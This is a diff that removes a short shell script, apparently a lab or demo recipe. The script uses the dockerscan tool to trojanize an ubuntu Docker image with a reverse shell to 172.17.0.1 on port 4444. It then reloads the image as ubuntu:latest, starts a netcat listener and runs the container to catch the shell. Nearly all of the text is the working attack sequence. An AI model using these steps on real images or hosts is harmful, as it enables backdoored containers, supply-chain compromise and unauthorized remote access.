@@ -1,9 +1,0 @@
-# Dockerscan needs to be installed 
-git clone https://github.com/cr0hn/dockerscan.git
-cd dockerscan
-sudo python3 setup.py install
-docker pull ubuntu:latest && docker save ubuntu:latest -o ubuntu-original
-dockerscan image modify trojanize ubuntu-original -l 172.17.0.1 -p 4444 -o ubuntu-original-trojanized
-docker load -i ubuntu-original-trojanized.tar
-nc -lvp 4444
-docker run -it ubuntu:latest /bin/bash
